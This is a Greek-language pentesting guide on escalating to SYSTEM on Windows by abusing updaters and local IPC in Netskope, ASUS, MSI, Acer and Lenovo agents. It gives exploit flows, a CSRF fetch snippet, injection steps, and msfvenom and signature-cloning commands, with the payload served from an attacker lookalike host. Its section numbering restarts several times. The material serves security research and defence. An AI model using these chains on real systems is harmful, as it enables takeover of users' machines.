# Κατάχρηση εταιρικών Auto-Updaters και προνομιούχου IPC (π.χ., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα γενικεύει μια κατηγορία αλυσίδων Windows local privilege escalation που εντοπίζονται σε εταιρικούς endpoint agents και updaters, οι οποίοι εκθέτουν μια εύκολα προσβάσιμη επιφάνεια IPC και μια προνομιούχα ροή ενημέρωσης. Χαρακτηριστικό παράδειγμα είναι το Netskope Client for Windows < R129 (CVE-2025-0309), όπου ένας χρήστης χαμηλών προνομίων μπορεί να εξαναγκάσει την εγγραφή σε server που ελέγχει ο επιτιθέμενος και κατόπιν να παραδώσει ένα κακόβουλο MSI, το οποίο εγκαθιστά η υπηρεσία SYSTEM.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Βασικές ιδέες που μπορείτε να αξιοποιήσετε σε παρόμοια προϊόντα:
- Καταχραστείτε το localhost IPC μιας προνομιούχας υπηρεσίας για να εξαναγκάσετε επανεγγραφή ή αναδιαμόρφωση προς server του επιτιθέμενου.
- Υλοποιήστε τα endpoints ενημέρωσης του προμηθευτή, παραδώστε ένα rogue Trusted Root CA και κατευθύνετε τον updater σε ένα κακόβουλο, «υπογεγραμμένο» πακέτο.
- Παρακάμψτε αδύναμους ελέγχους υπογραφής (λίστες επιτρεπόμενων CN), προαιρετικές σημαίες digest και χαλαρές ιδιότητες MSI.
- Αν το IPC είναι «κρυπτογραφημένο», παράγετε το key/IV από αναγνωριστικά του μηχανήματος που είναι ορατά σε όλους και αποθηκεύονται στο registry.
- Αν η υπηρεσία περιορίζει τους callers βάσει διαδρομής image/process name, κάντε inject σε μια επιτρεπόμενη διεργασία ή εκκινήστε μία σε αναστολή και αρχικοποιήστε το DLL σας μέσω μιας ελάχιστης τροποποίησης του thread context.

Οι custom τοπικές υπηρεσίες TCP απαιτούν τον ίδιο έλεγχο ταυτότητας και ορίων εισόδου, ακόμη κι όταν απαιτούν PIN ή άλλα διαπιστευτήρια εφαρμογής. Αντιστοιχίστε τον listener με τη διεργασία του και τον πραγματικό λογαριασμό υπηρεσίας και, στη συνέχεια, εξετάστε το ακριβές εγκατεστημένο binary/version και αν τα πεδία που ελέγχει ο caller ελέγχονται ως προς το μήκος τους πριν αντιγραφούν σε fixed buffers ή χρησιμοποιηθούν για τη δημιουργία εντολής child process. Οι [οδηγίες της Microsoft για buffer overrun](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) εξηγούν γιατί η μη ελεγμένη εξωτερική είσοδος είναι επικίνδυνη σε προνομιούχο native code. Ένας loopback listener, hardcoded credential ή όνομα διεργασίας από μόνο του δεν αποδεικνύει αλλοίωση μνήμης ή εκτέλεση ως SYSTEM· η προσβασιμότητα, η εξουσιοδότηση, η διαδρομή κώδικα και οι μετριασμοί παραμένουν ξεχωριστές προϋποθέσεις. Περιορίστε τη συνήθη απαρίθμηση σε παθητικές μεθόδους αντί να στέλνετε σε ενεργή υπηρεσία εισόδους με μήκη που προκαλούν crash.

---
## 1) Εξαναγκασμός εγγραφής σε server του επιτιθέμενου μέσω localhost IPC

Πολλοί agents περιλαμβάνουν μια user-mode UI διεργασία που επικοινωνεί με μια υπηρεσία SYSTEM μέσω localhost TCP χρησιμοποιώντας JSON.

Παρατηρήθηκε στο Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Ροή exploit:
1) Δημιουργήστε ένα JWT enrollment token, του οποίου τα claims ελέγχουν το backend host (π.χ., AddonUrl). Χρησιμοποιήστε alg=None, ώστε να μην απαιτείται υπογραφή.
2) Στείλτε το μήνυμα IPC που καλεί την εντολή provisioning μαζί με το JWT και το όνομα tenant σας:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Η υπηρεσία αρχίζει να στέλνει αιτήματα στον rogue server σας για εγγραφή/ρύθμιση παραμέτρων, π.χ.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Σημειώσεις:
- Αν η επαλήθευση του caller βασίζεται στη διαδρομή/το όνομα, προέλευσε το αίτημα από ένα allow-listed vendor binary (βλ. §4).<sup>[[1]](#references)[[2]](#references)</sup>

### IPC διαχείρισης εκτεθειμένο στο δίκτυο

Αυτό το όριο εμπιστοσύνης δεν περιορίζεται πάντα στο localhost. Στην αναφερθείσα περίπτωση του MyReport Updater 2.1.1, μια υπηρεσία `LocalSystem` άκουγε σε όλες τις διεπαφές και δεχόταν μη αυθεντικοποιημένη αλλαγή ρυθμίσεων gRPC για τον host αναφοράς, τη θύρα και τον τρόπο λειτουργίας. Για την απομακρυσμένη παραλλαγή απαιτούνταν τόσο πρόσβαση μέσω δικτύου στον listener όσο και εξερχόμενη πρόσβαση από την υπηρεσία προς την επιλεγμένη αναφορά. Αξιολογήστε αυτά τα στοιχεία ξεχωριστά από το αν η μεταγενέστερη ροή πακέτων μπορεί να παραβιάσει το όριο εγγραφής αρχείων.<sup>[[16]](#references)</sup>

---
## 2) Παραβίαση του καναλιού ενημέρωσης για εκτέλεση κώδικα ως SYSTEM

Μόλις ο client επικοινωνήσει με τον server σας, υλοποιήστε τα αναμενόμενα endpoints και κατευθύνετέ τον σε ένα MSI του επιτιθέμενου. Τυπική ακολουθία:

1) /v2/config/org/clientconfig → Επιστρέψτε ρυθμίσεις JSON με πολύ σύντομο διάστημα ενημέρωσης του updater, π.χ.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Επιστρέφει ένα πιστοποιητικό CA σε PEM. Η υπηρεσία το εγκαθιστά στο store Trusted Root του Local Machine.
3) /v2/checkupdate → Παρέχετε metadata που δείχνουν σε ένα κακόβουλο MSI και μια πλαστή έκδοση.

Παράκαμψη συνηθισμένων ελέγχων που συναντώνται στην πράξη:
- Allow-list CN υπογράφοντος: η υπηρεσία μπορεί να ελέγχει μόνο αν το Subject CN ισούται με “netSkope Inc” ή “Netskope, Inc.”. Η rogue CA σας μπορεί να εκδώσει ένα leaf με αυτό το CN και να υπογράψει το MSI.
- Ιδιότητα CERT_DIGEST: συμπεριλάβετε μια αβλαβή ιδιότητα MSI με όνομα CERT_DIGEST. Δεν υπάρχει επιβολή κατά την εγκατάσταση.
- Προαιρετική επιβολή digest: μια σημαία ρυθμίσεων (π.χ. check_msi_digest=false) απενεργοποιεί την πρόσθετη κρυπτογραφική επικύρωση.

Αποτέλεσμα: η υπηρεσία SYSTEM εγκαθιστά το MSI από
C:\ProgramData\Netskope\stAgent\data\*.msi
και εκτελεί αυθαίρετο κώδικα ως NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Δίδαγμα για την παράκαμψη ενημερώσεων κώδικα: αν ένας προμηθευτής απαντήσει προσθέτοντας σε allow-list ένα μικρό σύνολο «έμπιστων» domains αντί να αυθεντικοποιεί κρυπτογραφικά την πηγή της ενημέρωσης, αναζητήστε redirectors ή reverse proxies που ανήκουν στον προμηθευτή και εξακολουθούν να σας επιτρέπουν να κατευθύνετε την κίνηση. Στην περίπτωση της Netskope, δημόσια έρευνα που ακολούθησε έδειξε ότι μια allow-list της εποχής R129 μπορούσε και πάλι να γίνει αντικείμενο εκμετάλλευσης μέσω του `rproxy.goskope.com`, το οποίο λειτουργούσε ως proxy για περιεχόμενο Azure App Service ελεγχόμενο από τον επιτιθέμενο. Αντιμετωπίστε τις allow-list ονομάτων host ως μικρό εμπόδιο, όχι ως όριο εμπιστοσύνης.<sup>[[14]](#references)</sup>

Ένας ακόμη τρόπος αποτυχίας είναι τα **αυτοσυνεπή αλλά μη αυθεντικοποιημένα metadata πακέτου**. Στην περίπτωση του MyReport, μια αναφορά ελεγχόμενη από τον επιτιθέμενο παρείχε ένα τροποποιημένο archive, ενώ ένας ενδιάμεσος άλλαζε τα MD5 digest και τα μεγέθη του προμηθευτή πριν φτάσουν στον updater. Η αντιστοίχιση αυτών των τιμών έλεγχε τη συνέπεια των αποκρίσεων, όχι την προέλευσή τους από τον προμηθευτή· δεν χρειάστηκε σύγκρουση MD5. Έπειτα, ένας κατάλογος εγκατάστασης που επιλεγόταν από τον caller μετέτρεψε την προνομιούχα αποσυμπίεση σε όριο εγγραφής αρχείων. Το primitive φόρτωσης DLL που προέκυψε καλύπτεται στην ενότητα [chaining an arbitrary file write into DLL hijacking](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Πλαστογράφηση κρυπτογραφημένων αιτημάτων IPC (όπου υπάρχουν)

Από την έκδοση R127, η Netskope τύλιγε το JSON IPC σε ένα πεδίο encryptData που μοιάζει με Base64. Η αντίστροφη ανάλυση έδειξε AES με key/IV που παράγονταν από τιμές registry αναγνώσιμες από κάθε χρήστη:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Οι επιτιθέμενοι μπορούν να αναπαράγουν την κρυπτογράφηση και να στείλουν έγκυρες κρυπτογραφημένες εντολές από έναν απλό χρήστη.<sup>[[1]](#references)[[2]](#references)</sup> Γενική συμβουλή: αν ένας agent αρχίσει ξαφνικά να «κρυπτογραφεί» το IPC του, αναζητήστε device IDs, product GUIDs και install IDs κάτω από το HKLM ως υλικό για την κρυπτογράφηση.

---
## 4) Παράκαμψη allow-list καλούντων IPC (έλεγχοι διαδρομής/ονόματος)

Ορισμένες υπηρεσίες προσπαθούν να αυθεντικοποιήσουν τον peer εντοπίζοντας το PID της σύνδεσης TCP και συγκρίνοντας τη διαδρομή/το όνομα του image με allow-listed εκτελέσιμα αρχεία του προμηθευτή, τα οποία βρίσκονται κάτω από το Program Files (π.χ., stagentui.exe, bwansvc.exe, epdlp.exe).

Δύο πρακτικές παρακάμψεις:
- DLL injection σε μια allow-listed διεργασία (π.χ., nsdiag.exe) και proxy του IPC από μέσα της.
- Εκκίνηση ενός allow-listed binary σε αναστολή και bootstrap του proxy DLL χωρίς CreateRemoteThread (βλ. §5), ώστε να ικανοποιούνται οι κανόνες προστασίας από παραποίηση που επιβάλλει ο driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection συμβατό με προστασία από παραποίηση: διεργασία σε αναστολή + patch NtContinue

Τα προϊόντα συχνά περιλαμβάνουν έναν driver minifilter/OB callbacks (π.χ., Stadrv) που αφαιρεί επικίνδυνα δικαιώματα από handles προς προστατευμένες διεργασίες:
- Process: αφαιρεί τα PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: περιορίζει τα δικαιώματα σε THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Ένας αξιόπιστος loader σε user mode που τηρεί αυτούς τους περιορισμούς:
1) Δημιουργήστε μια διεργασία vendor binary με CREATE_SUSPENDED.
2) Αποκτήστε handles για όσα δικαιώματα εξακολουθείτε να επιτρέπεται να χρησιμοποιείτε: PROCESS_VM_WRITE | PROCESS_VM_OPERATION στη διεργασία και ένα handle thread με THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ή μόνο THREAD_RESUME, αν κάνετε patch κώδικα σε γνωστό RIP).
3) Αντικαταστήστε το ntdll!NtContinue (ή κάποιο άλλο πρώιμο, εγγυημένα αντιστοιχισμένο thunk) με ένα μικρό stub που καλεί το LoadLibraryW στη διαδρομή του DLL σας και έπειτα επιστρέφει.
4) Καλέστε ResumeThread για να εκτελεστεί το stub μέσα στη διεργασία και να φορτωθεί το DLL σας.

Εφόσον δεν χρησιμοποιήσατε τα PROCESS_CREATE_THREAD ή PROCESS_SUSPEND_RESUME σε ήδη προστατευμένη διεργασία (εσείς τη δημιουργήσατε), τηρείται η πολιτική του driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Πρακτικά εργαλεία
- Το NachoVPN (plugin της Netskope) αυτοματοποιεί τη δημιουργία rogue CA, την υπογραφή κακόβουλου MSI και την παροχή των απαιτούμενων endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- Το UpSkope είναι ένας custom client IPC που δημιουργεί αυθαίρετα μηνύματα IPC (προαιρετικά κρυπτογραφημένα με AES) και περιλαμβάνει injection διεργασίας σε αναστολή, ώστε τα μηνύματα να προέρχονται από allow-listed binary.<sup>[[4]](#references)</sup>

## 7) Γρήγορη ροή εργασίας για αρχική διαλογή άγνωστων επιφανειών updater/IPC

Όταν εξετάζετε έναν νέο endpoint agent ή μια σουίτα «βοηθητικών» εργαλείων μητρικής πλακέτας, συνήθως αρκεί μια γρήγορη ροή εργασίας για να διαπιστώσετε αν πρόκειται για υποσχόμενο στόχο privesc:<sup>[[6]](#references)</sup>

1) Καταγράψτε τους loopback listeners και αντιστοιχίστε τους στις διεργασίες των προμηθευτών:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Καταγράψτε τους υποψήφιους named pipes:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Εξαγωγή δεδομένων δρομολόγησης που αποθηκεύονται στο registry και χρησιμοποιούνται από IPC servers με αρχιτεκτονική plugin:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Εξαγάγετε πρώτα τα ονόματα endpoint, τα JSON keys και τα command IDs από τον client σε user-mode. Τα packed Electron/.NET frontends συχνά κάνουν leak ολόκληρο το schema:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Αναζητήστε το πραγματικό κριτήριο εμπιστοσύνης, όχι απλώς τη διαδρομή κώδικα που τελικά εκκινεί τη διεργασία:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Μοτίβα που αξίζει να ιεραρχήσετε:
- Το `CryptQueryObject`/parsing πιστοποιητικών χωρίς `WinVerifyTrust` συνήθως σημαίνει ότι το «υπάρχει πιστοποιητικό» θεωρήθηκε ισοδύναμο με το «το πιστοποιητικό είναι έμπιστο», επιτρέποντας cloning πιστοποιητικών ή άλλα τεχνάσματα με πλαστό signer.
- Οι έλεγχοι υποσυμβολοσειράς/επιθήματος σε `Origin`, `Referer`, URL λήψεων, ονόματα διεργασιών ή CN signer δεν αποτελούν authentication. Το `contains(".vendor.com")` είναι συνήθως εκμεταλλεύσιμο με lookalike domains που ελέγχει ο attacker.
- Αν το GUI με χαμηλά προνόμια αποφασίζει ότι «το αρχείο είναι έμπιστο» και ο SYSTEM broker απλώς χρησιμοποιεί αυτό το αποτέλεσμα, η τροποποίηση ή η επανυλοποίηση του DLL/JS στην πλευρά του client συχνά παρακάμπτει πλήρως το όριο ασφαλείας (διαχωρισμός επικύρωσης τύπου Razer).
- Αν ο broker αντιγράφει ένα payload στο `%TEMP%`/`C:\Windows\Temp` και στη συνέχεια το επικυρώνει ή προγραμματίζει την εκτέλεσή του από αυτήν τη διαδρομή, ελέγξτε αμέσως για παράθυρα αντικατάστασης TOCTOU και για sibling plugin modules που εκθέτουν εναλλακτικά wrappers `ExecuteTask()` με ασθενέστερους ελέγχους.<sup>[[6]](#references)</sup>

Για στόχους που βασίζονται σε μεγάλο βαθμό σε named pipes, το PipeViewer είναι ένας γρήγορος τρόπος να εντοπίσετε αδύναμα DACL και pipes προσβάσιμα από απόσταση, προτού αρχίσετε να κάνετε reverse engineering του πρωτοκόλλου σε βάθος.<sup>[[11]](#references)</sup>

Αν ο στόχος κάνει authentication των callers μόνο με βάση το PID, τη διαδρομή του image ή το όνομα της διεργασίας, αντιμετωπίστε το ως εμπόδιο ταχύτητας και όχι ως όριο ασφαλείας: συχνά αρκεί να κάνετε injection στον νόμιμο client ή να συνδεθείτε από μια διεργασία στη λίστα επιτρεπόμενων, ώστε να ικανοποιηθούν οι έλεγχοι του server. Ειδικά για named pipes, [αυτή η σελίδα σχετικά με το client impersonation και την κατάχρηση pipes](named-pipe-client-impersonation.md) καλύπτει την τεχνική με περισσότερες λεπτομέρειες.

Για έναν προνομιούχο **broker καθαρισμού ή επαναφοράς**, εξετάστε το όριο εμπιστοσύνης των διαδρομών, καθώς και το ACL του pipe. Ένας caller με λιγότερα προνόμια μπορεί να είναι σε θέση να επιλέξει έναν προορισμό επαναφοράς ή να μετονομάσει ένα προσωρινά αποθηκευμένο backup artifact σε κοινόχρηστο directory, ακόμη κι όταν το εκτελέσιμο του service και το directory εγκατάστασής του είναι προστατευμένα. Επιβεβαιώστε ξεχωριστά ότι ο caller μπορεί να καλέσει την εντολή επαναφοράς, να τροποποιήσει το συγκεκριμένο προσωρινά αποθηκευμένο input ή το όνομα αρχείου, ότι ο broker εκτελείται με υψηλότερο identity και ότι η λειτουργία επαναφοράς γράφει πράγματι στην επιλεγμένη προστατευμένη διαδρομή. Ένα εγγράψιμο directory προσωρινής αποθήκευσης ή ένα αναγνώσιμο pipe από μόνο του δεν αποδεικνύει αυθαίρετη εγγραφή με προνόμια· απαιτείται ανασκόπηση κώδικα ή ελεγχόμενη δοκιμή της αντιστοίχισης προορισμού και της συμπεριφοράς του service. Μην καλέσετε άγνωστη εντολή καθαρισμού κατά την παθητική απαρίθμηση, επειδή μπορεί να διαγράψει αρχεία χρήστη.

---
## 8) Modular add-in brokers με authentication μόνο μέσω υπογραφών vendor (μοτίβο Lenovo Vantage)

Μια νεότερη παραλλαγή που αξίζει να αναζητήσετε είναι ο **broker RPC με υπογεγραμμένο client**: μια διεργασία desktop της Lenovo με χαμηλά προνόμια, υπογεγραμμένη από τη Lenovo, επικοινωνεί με ένα SYSTEM service, και το service δρομολογεί εντολές JSON σε ένα σύνολο add-ins που περιγράφονται σε XML κάτω από το `%ProgramData%`. Μόλις επιτευχθεί εκτέλεση κώδικα **μέσα σε οποιονδήποτε αποδεκτό υπογεγραμμένο client**, κάθε contract με `runas="system"` γίνεται μέρος της επιφάνειας επίθεσης.<sup>[[15]](#references)</sup>

Υψηλής αξίας τεχνικές που παρατηρήθηκαν σε έρευνα για το Lenovo Vantage:
- **Εμπιστοσύνη στον caller επειδή έχει υπογραφεί από τον vendor**: οι ερευνητές απέκτησαν authenticated context αντιγράφοντας ένα EXE υπογεγραμμένο από τη Lenovo σε εγγράψιμο directory και ικανοποιώντας ένα DLL side-load (`profapi.dll`), ώστε να εκτελεστεί αυθαίρετος κώδικας μέσα σε client που το service ήδη εμπιστευόταν.
- **Ανακάλυψη επιφάνειας επίθεσης μέσω manifest**: τα add-ins δηλώνονται κάτω από το `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`· αρκετά contracts εκτελούνται ως `SYSTEM`, επομένως η απαρίθμηση αυτών των manifests συχνά αποκαλύπτει τις πραγματικές προνομιούχες ενέργειες ταχύτερα από το reverse engineering του ίδιου του broker.
- **Bugs ανά εντολή πίσω από το authenticated channel**: μόλις βρεθείτε μέσα στον έμπιστο client, η δημόσια έρευνα εντόπισε path traversal και race conditions σε εντολές ενημέρωσης/εγκατάστασης, κατάχρηση raw SQL σε προνομιούχες βάσεις δεδομένων ρυθμίσεων και ελέγχους διαδρομών registry βασισμένους σε υποσυμβολοσειρές, οι οποίοι επέτρεπαν εγγραφές εκτός του προβλεπόμενου hive.

Χρήσιμο recon σε έναν στόχο:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Πρακτικό συμπέρασμα: κάθε φορά που μια σουίτα βοηθητικών εργαλείων εκθέτει έναν broker, ο οποίος πρώτα επαληθεύει την ταυτότητα της **διεργασίας-καλούντος** και μετά δρομολογεί κλήσεις σε δεκάδες εντολές plugin/add-in, μην σταματάτε αφού παρακάμψετε τον αρχικό έλεγχο εμπιστοσύνης. Κάντε dump τον πίνακα manifest/contract και κάντε fuzz κάθε εντολή υψηλών προνομίων ξεχωριστά· το αυθεντικοποιημένο κανάλι συνήθως κρύβει αρκετά σφάλματα δεύτερου σταδίου.

---
## 1) CSRF από browser προς localhost σε προνομιακά HTTP API (ASUS DriverHub)

Το DriverHub εγκαθιστά μια HTTP υπηρεσία σε user mode (ADU.exe) στη διεύθυνση 127.0.0.1:53000, η οποία αναμένει κλήσεις από browser που προέρχονται από το https://driverhub.asus.com. Το φίλτρο origin απλώς εκτελεί `string_contains(".asus.com")` στην κεφαλίδα Origin και στις διευθύνσεις λήψης που εκτίθενται μέσω του `/asus/v1.0/*`. Επομένως, οποιοσδήποτε host ελέγχεται από επιτιθέμενο, όπως το `https://driverhub.asus.com.attacker.tld`, περνά τον έλεγχο και μπορεί να στείλει αιτήματα που αλλάζουν την κατάσταση μέσω JavaScript.<sup>[[6]](#references)</sup> Δείτε τα [βασικά στοιχεία του CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md) για επιπλέον μοτίβα παράκαμψης.

Πρακτική ροή:
1) Καταχωρίστε ένα domain που περιέχει το `.asus.com` και φιλοξενήστε εκεί μια κακόβουλη ιστοσελίδα.
2) Χρησιμοποιήστε `fetch` ή XHR για να καλέσετε ένα προνομιακό endpoint (π.χ. `Reboot`, `UpdateApp`) στη διεύθυνση `http://127.0.0.1:53000`.
3) Στείλτε το JSON body που αναμένει ο handler – το packed JavaScript του frontend δείχνει το παρακάτω schema.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Ακόμη και το PowerShell CLI που εμφανίζεται παρακάτω πετυχαίνει όταν η κεφαλίδα Origin πλαστογραφείται ώστε να έχει την έμπιστη τιμή:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Οποιαδήποτε επίσκεψη στον ιστότοπο του επιτιθέμενου μέσω browser μετατρέπεται, επομένως, σε local CSRF με 1 κλικ (ή 0 κλικ μέσω `onload`), που θέτει σε λειτουργία έναν helper με δικαιώματα SYSTEM.

---
## 2) Μη ασφαλής επαλήθευση code-signing και κλωνοποίηση πιστοποιητικού (ASUS UpdateApp)

Το `/asus/v1.0/UpdateApp` κατεβάζει αυθαίρετα εκτελέσιμα που ορίζονται στο JSON body και τα αποθηκεύει προσωρινά στο `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Η επικύρωση του URL λήψης χρησιμοποιεί την ίδια λογική υποσυμβολοσειρών, οπότε γίνεται αποδεκτό το `http://updates.asus.com.attacker.tld:8000/payload.exe`. Μετά τη λήψη, το ADU.exe απλώς ελέγχει αν το PE περιέχει υπογραφή και αν η συμβολοσειρά Subject αντιστοιχεί στην ASUS πριν το εκτελέσει — χωρίς `WinVerifyTrust` και χωρίς επικύρωση της αλυσίδας πιστοποιητικών.

Για να οπλοποιηθεί η ροή:
1) Δημιουργήστε ένα payload (π.χ., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Κλωνοποιήστε τον υπογράφοντα της ASUS σε αυτό (π.χ., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Φιλοξενήστε το `pwn.exe` σε έναν lookalike domain `.asus.com` και ενεργοποιήστε το UpdateApp μέσω του browser CSRF παραπάνω.

Επειδή τόσο τα φίλτρα Origin όσο και URL βασίζονται σε υποσυμβολοσειρές και ο έλεγχος υπογράφοντα συγκρίνει μόνο συμβολοσειρές, το DriverHub κατεβάζει και εκτελεί το binary του επιτιθέμενου με αυξημένα δικαιώματα.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU στις διαδρομές αντιγραφής/εκτέλεσης του updater (MSI Center CMD_AutoUpdateSDK)

Η υπηρεσία SYSTEM του MSI Center εκθέτει ένα TCP πρωτόκολλο, όπου κάθε frame έχει τη μορφή `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Το βασικό component (Component ID `0f 27 00 00`) παρέχει το `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Ο handler του:
1) Αντιγράφει το παρεχόμενο εκτελέσιμο στο `C:\Windows\Temp\MSI Center SDK.exe`.
2) Επαληθεύει την υπογραφή μέσω του `CS_CommonAPI.EX_CA::Verify` (το subject του πιστοποιητικού πρέπει να είναι “MICRO-STAR INTERNATIONAL CO., LTD.” και να περάσει το `WinVerifyTrust`).
3) Δημιουργεί μια προγραμματισμένη εργασία που εκτελεί το προσωρινό αρχείο ως SYSTEM, με ορίσματα που ελέγχει ο επιτιθέμενος.

Το αρχείο που αντιγράφηκε δεν κλειδώνεται ανάμεσα στην επαλήθευση και την κλήση του `ExecuteTask()`. Ένας επιτιθέμενος μπορεί να:
- Στείλει το Frame A με μια νόμιμη, υπογεγραμμένη από την MSI, binary (εξασφαλίζοντας ότι ο έλεγχος υπογραφής θα περάσει και ότι η εργασία θα προγραμματιστεί).
- Το συνδυάσει με επαναλαμβανόμενα μηνύματα Frame B που δείχνουν σε ένα κακόβουλο payload, αντικαθιστώντας το `MSI Center SDK.exe` αμέσως μετά την ολοκλήρωση της επαλήθευσης.

Όταν ενεργοποιηθεί ο scheduler, εκτελεί το αντικατασταθέν payload ως SYSTEM, παρότι είχε επικυρώσει το αρχικό αρχείο. Για αξιόπιστη εκμετάλλευση χρησιμοποιούνται δύο goroutines/threads που στέλνουν επανειλημμένα το CMD_AutoUpdateSDK μέχρι να κερδηθεί το παράθυρο TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Κατάχρηση custom IPC επιπέδου SYSTEM και impersonation (MSI Center + Acer Control Centre)

### Σύνολα εντολών TCP του MSI Center
- Κάθε plugin/DLL που φορτώνεται από το `MSI.CentralServer.exe` λαμβάνει ένα Component ID, αποθηκευμένο στο `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Τα πρώτα 4 bytes ενός frame επιλέγουν αυτό το component, επιτρέποντας στους επιτιθέμενους να δρομολογούν εντολές σε αυθαίρετα modules.
- Τα plugins μπορούν να ορίζουν τους δικούς τους task runners. Το `Support\API_Support.dll` εκθέτει το `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` και καλεί απευθείας το `API_Support.EX_Task::ExecuteTask()` **χωρίς επικύρωση υπογραφής** — οποιοσδήποτε τοπικός χρήστης μπορεί να το κατευθύνει στο `C:\Users\<user>\Desktop\payload.exe` και να πετύχει εκτέλεση SYSTEM με προβλέψιμο τρόπο.
- Η παρακολούθηση του loopback με Wireshark ή η ανάλυση των .NET binaries στο dnSpy αποκαλύπτει γρήγορα την αντιστοίχιση Component ↔ command· στη συνέχεια, custom clients σε Go/Python μπορούν να αναπαράγουν τα frames.<sup>[[6]](#references)</sup>

### Named pipes του Acer Control Centre και επίπεδα impersonation
- Το `ACCSvc.exe` (SYSTEM) εκθέτει το `\\.\pipe\treadstone_service_LightMode` και η διακριτική ACL του επιτρέπει απομακρυσμένους clients (π.χ., `\\TARGET\pipe\treadstone_service_LightMode`). Η αποστολή του command ID `7` μαζί με μια διαδρομή αρχείου καλεί τη ρουτίνα του service για εκκίνηση διεργασιών.
- Η client library σειριοποιεί ένα byte-terminator με τιμή 113 μαζί με τα args. Η δυναμική ανάλυση με Frida/`TsDotNetLib` (δείτε το [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) για συμβουλές σχετικά με την ανάλυση) δείχνει ότι ο native handler αντιστοιχίζει αυτή την τιμή σε ένα `SECURITY_IMPERSONATION_LEVEL` και ένα integrity SID πριν καλέσει το `CreateProcessAsUser`.
- Η αντικατάσταση του 113 (`0x71`) με 114 (`0x72`) οδηγεί στον γενικό κλάδο, ο οποίος διατηρεί ολόκληρο το SYSTEM token και ορίζει ένα SID υψηλής ακεραιότητας (`S-1-16-12288`). Έτσι, το binary που εκκινείται εκτελείται ως SYSTEM χωρίς περιορισμούς, τόσο τοπικά όσο και μεταξύ μηχανημάτων.
- Συνδυάστε το με το εκτεθειμένο flag του installer (`Setup.exe -nocheck`) για να εγκαταστήσετε το ACC ακόμη και σε lab VMs και να δοκιμάσετε το pipe χωρίς hardware του κατασκευαστή.<sup>[[6]](#references)</sup>

Αυτά τα IPC bugs αναδεικνύουν γιατί οι υπηρεσίες localhost πρέπει να επιβάλλουν mutual authentication (ALPC SIDs, φίλτρα `ImpersonationLevel=Impersonation`, token filtering) και γιατί ο helper «εκτέλεσης αυθαίρετου binary» κάθε module πρέπει να εφαρμόζει τους ίδιους ελέγχους υπογραφής.

---
